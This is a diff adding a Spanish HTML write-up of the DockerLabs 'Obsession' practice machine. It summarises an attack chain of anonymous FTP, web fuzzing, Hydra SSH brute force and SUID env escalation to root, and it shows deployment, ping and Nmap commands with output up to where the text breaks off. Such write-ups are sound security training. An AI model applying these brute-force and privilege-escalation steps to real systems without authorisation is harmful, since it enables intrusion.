@@ -1,0 +1,1419 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Obsession — DockerLabs Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Obsession de DockerLabs — Dificultad: Muy Fácil. FTP anon + wfuzz + Hydra SSH + SUID env.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00e5ff;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(0,255,136,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--green); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-vfacil { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-docker { color: var(--cyan);   border-color: rgba(0,229,255,0.3);  background: rgba(0,229,255,0.05); }
+    .badge-linux  { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
+    .badge-ftp    { color: var(--orange); border-color: rgba(255,140,0,0.4);  background: rgba(255,140,0,0.05); }
+    .badge-hydra  { color: var(--red);    border-color: rgba(255,45,85,0.3);  background: rgba(255,45,85,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-cyan   { color: var(--cyan); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-vfacil { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,255,136,0.15);
+      border-left: 3px solid var(--green); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+
+    /* INFO BOX */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    /* CRED BOX */
+    .cred-box { border: 1px solid rgba(0,255,136,0.25); background: rgba(0,255,136,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; display: flex; gap: 2rem; flex-wrap: wrap; }
+    .cred-item .cred-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 0.3rem; }
+    .cred-item .cred-val   { font-family: var(--font-mono); font-size: 0.95rem; color: var(--green); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--green); letter-spacing: 2px; border-bottom-color: rgba(0,255,136,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--cyan); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,255,136,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,255,136,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--green); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--cyan); }
+
+    /* FOOTER */
+    footer { padding: 2rem 4rem; border-top: 1px solid var(--dim); display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      nav, .writeup-hero, footer { padding-left: 1.5rem; padding-right: 1.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/dockerlabs/">dockerlabs</a> /
+      <span>obsession</span>
+    </p>
+    <h1 class="writeup-title"><span>Obsession</span></h1>
+    <p class="writeup-subtitle">DockerLabs — Linux · FTP Anonymous → wfuzz → Hydra SSH → SUID env</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-vfacil">● MUY FÁCIL</span>
+      <span class="meta-badge badge-docker">DOCKERLABS</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-ftp">FTP ANON</span>
+      <span class="meta-badge badge-hydra">HYDRA BRUTE FORCE</span>
+      <span class="meta-date">📅 Abril 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#ftp">03 · Enumeración FTP</a></li>
+        <li><a href="#web">04 · Enumeración Web</a></li>
+        <li><a href="#fuzz">05 · Fuzzing de Directorios</a></li>
+        <li><a href="#hydra">06 · Fuerza Bruta SSH</a></li>
+        <li><a href="#acceso">07 · Acceso Inicial SSH</a></li>
+        <li><a href="#privesc">08 · Escalada de Privilegios</a></li>
+        <li><a href="#root">09 · Root &amp; Easter Egg</a></li>
+        <li><a href="#referencia">10 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">11 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-cyan">DockerLabs</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-vfacil">Muy Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">172.17.0.2</span></div>
+      <div class="info-row"><span class="info-label">Creador</span><span class="info-val val-cyan">Juan</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap</span> → puertos 21, 22, 80</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>FTP anon</span> → chat-gonza.txt, pendientes.txt</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>xsltproc</span> → reporte HTML del scan</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>wfuzz</span> → /backup y /important</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>backup.txt</span> → usuario: russoski</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Hydra</span> → pass: iloveme</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSH</span> → acceso como russoski</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></div><div class="ap-text"><span style="color:var(--red)">SUID /usr/bin/env</span> → ROOT</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Obsession</strong> es una máquina de dificultad <span class="hl">muy fácil</span>
+          de la plataforma <span class="hl-cyan">DockerLabs</span>, creada por
+          <strong>Juan</strong> el 25/06/2024. Corre sobre <strong>Linux Ubuntu 24.04 LTS</strong>
+          y expone tres servicios: <span class="hl-cyan">FTP (puerto 21)</span> con acceso anónimo
+          habilitado, <span class="hl-cyan">SSH (puerto 22)</span> y un servidor web
+          <span class="hl-cyan">HTTP (puerto 80)</span> con Apache 2.4.58.
+        </p>
+        <p>
+          El vector de ataque es progresivo: primero se enumeran los archivos del servidor FTP
+          de forma anónima, encontrando archivos de texto con información sensible. Luego se
+          realiza fuzzing de directorios web con <strong>wfuzz</strong>, descubriendo un directorio
+          <span class="hl">/backup</span> que expone el nombre de usuario del sistema:
+          <span class="hl">russoski</span>. Con ese usuario se ejecuta fuerza bruta sobre SSH
+          con <strong>Hydra</strong>, obteniendo la contraseña <span class="hl">iloveme</span>.
+          Una vez dentro, la escalada a <span class="hl-red">root</span> se logra explotando el
+          bit <strong>SUID</strong> del binario <code style="color:var(--cyan)">/usr/bin/env</code>,
+          idéntico al vector de Database pero llegando por un camino completamente distinto.
+        </p>
+        <p>
+          Como bonus, la máquina incluye un <strong>easter egg</strong>: un enlace a un video
+          de YouTube oculto en un archivo dentro del directorio root, firmado por el creador.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Despliegue</td><td>auto_deploy.sh + ping</td><td>Máquina activa en 172.17.0.2</td></tr>
+          <tr><td>Reconocimiento</td><td>Nmap -sCV full scan + xsltproc</td><td>Puertos 21, 22, 80 abiertos; FTP anon habilitado</td></tr>
+          <tr><td>Enum. FTP</td><td>FTP login anónimo</td><td>chat-gonza.txt y pendientes.txt descargados</td></tr>
+          <tr><td>Enum. Web</td><td>wfuzz directory fuzzing</td><td>Directorios /backup e /important encontrados</td></tr>
+          <tr><td>Reconocimiento</td><td>backup.txt en /backup</td><td>Usuario: russoski</td></tr>
+          <tr><td>Acceso inicial</td><td>Hydra SSH brute force + rockyou.txt</td><td>Contraseña: iloveme</td></tr>
+          <tr><td>Acceso inicial</td><td>SSH + ssh-keygen -R</td><td>Shell como russoski</td></tr>
+          <tr><td>Privesc</td><td>sudo -l + SUID /usr/bin/env</td><td>Shell como root</td></tr>
+          <tr><td>Post-explot.</td><td>Exploración manual</td><td>Easter egg: YouTube link en /root</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">DESPLIEGUE DE LA MÁQUINA</span>
+      </div>
+      <div class="prose">
+        <p>
+          El primer paso es siempre desplegar la máquina vulnerable. DockerLabs provee un script
+          <strong>auto_deploy.sh</strong> que automatiza la creación del contenedor Docker a partir
+          del archivo <span class="hl-cyan">obsession.tar</span>. El script construye la imagen,
+          levanta el contenedor, asigna automáticamente una dirección IP dentro de la red Docker
+          interna (<strong>172.17.0.x</strong>) y mantiene la máquina corriendo hasta que se
+          presione <span class="hl">Ctrl+C</span>, momento en que el contenedor se destruye y
+          limpia. Es importante ejecutarlo con <strong>sudo</strong> porque Docker requiere
+          permisos de administrador para manipular interfaces de red e imágenes.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh obsession.tar">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DEPLOY</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">obsession.tar</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Estamos desplegando la máquina vulnerable, espere un momento.</div>
+        <div>&nbsp;</div>
+        <div class="o-green">Máquina desplegada, su dirección IP es ——&gt; <strong>172.17.0.2</strong></div>
+        <div class="o-red">Presiona Ctrl+C cuando termines con la máquina para eliminarla</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">VERIFICACIÓN DE CONECTIVIDAD — PING</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de lanzar cualquier escaneo, es buena práctica verificar que la máquina objetivo
+          está activa y responde a tráfico ICMP. El comando <span class="hl-cyan">ping</span> con
+          la flag <span class="hl-cyan">-c 3</span> envía exactamente 3 paquetes ICMP echo-request
+          y espera su respuesta (echo-reply). Si el host responde, sabemos que la red Docker está
+          correctamente configurada y podemos proceder. El valor de <strong>TTL=64</strong>
+          en la respuesta es característico de sistemas Linux, lo que nos da una pista temprana
+          del sistema operativo objetivo antes incluso de usar Nmap.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ping 172.17.0.2 -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PING</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">172.17.0.2</span> <span class="flag">-c 3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.</div>
+        <div><span class="o-green">64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.067 ms</span></div>
+        <div><span class="o-green">64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.071 ms</span></div>
+        <div><span class="o-green">64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.142 ms</span></div>
+        <div>&nbsp;</div>
+        <div>--- 172.17.0.2 ping statistics ---</div>
+        <div>3 packets transmitted, 3 received, <span class="o-green">0% packet loss</span>, time 2030ms</div>
+        <div>rtt min/avg/max/mdev = 0.067/0.093/0.142/0.034 ms</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// TTL COMO FINGERPRINT DE OS</p>
+        <p>El valor <strong>TTL (Time To Live)</strong> del paquete ICMP nos indica el sistema operativo aproximado sin necesidad de herramientas adicionales. <strong>TTL=64</strong> → Linux/Unix. <strong>TTL=128</strong> → Windows. <strong>TTL=255</strong> → Cisco/Network devices. Aquí TTL=64 confirma que estamos ante un sistema Linux.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">ESCANEO DE PUERTOS CON NMAP Y EXPORTACIÓN XML</span>
+      </div>
+      <div class="prose">
+        <p>
+          Realizamos un escaneo exhaustivo con Nmap sobre todos los puertos TCP. La flag
+          <span class="hl-cyan">-oX</span> exporta el resultado en formato <strong>XML</strong>,
+          que luego convertiremos a HTML con <span class="hl-cyan">xsltproc</span> para tener
+          un reporte visual navegable. El escaneo descubre <strong>3 puertos abiertos</strong>:
+        </p>
+        <p>
+          <span class="hl">Puerto 21 — FTP</span> corriendo <strong>vsftpd 3.0.5</strong>.
+          Nmap detecta automáticamente mediante el script <code style="color:var(--cyan)">ftp-anon</code>
+          que el servidor tiene el <span class="hl">login anónimo habilitado</span> (FTP code 230),
+          y lista dos archivos en el directorio raíz del FTP:
+          <code style="color:var(--cyan)">chat-gonza.txt</code> (667 bytes, Jun 18 2024) y
+          <code style="color:var(--cyan)">pendientes.txt</code> (315 bytes, Jun 18 2024).
+        </p>
+        <p>
+          <span class="hl">Puerto 22 — SSH</span> con <strong>OpenSSH 9.6p1</strong> sobre
+          Ubuntu Linux (protocol 2.0). Este será nuestro vector de acceso una vez tengamos
+          credenciales válidas.
+        </p>
+        <p>
+          <span class="hl">Puerto 80 — HTTP</span> con <strong>Apache 2.4.58 (Ubuntu)</strong>.
+          El título de la página es <strong>"Russoski Coaching"</strong>, lo que ya nos anticipa
+          un nombre de usuario potencial. El header del servidor confirma Apache sobre Ubuntu.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX obsession.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">172.17.0.2</span> <span class="flag">-oX</span> <span class="arg">obsession.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 — Nmap scan report for 172.17.0.2</div>
+        <div>Host is up (0.0000090s latency).</div>
+        <div>&nbsp;</div>
+        <div>PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE  SERVICE&nbsp;&nbsp;VERSION</div>
+        <div><span class="o-yellow">21/tcp&nbsp;&nbsp;open&nbsp;&nbsp; ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vsftpd 3.0.5</span></div>
+        <div>| ftp-anon: <span class="o-green">Anonymous FTP login allowed (FTP code 230)</span></div>
+        <div>| -rw-r--r--  1 0  0  667 Jun 18 2024 <span class="o-cyan">chat-gonza.txt</span></div>
+        <div>| -rw-r--r--  1 0  0  315 Jun 18 2024 <span class="o-cyan">pendientes.txt</span></div>
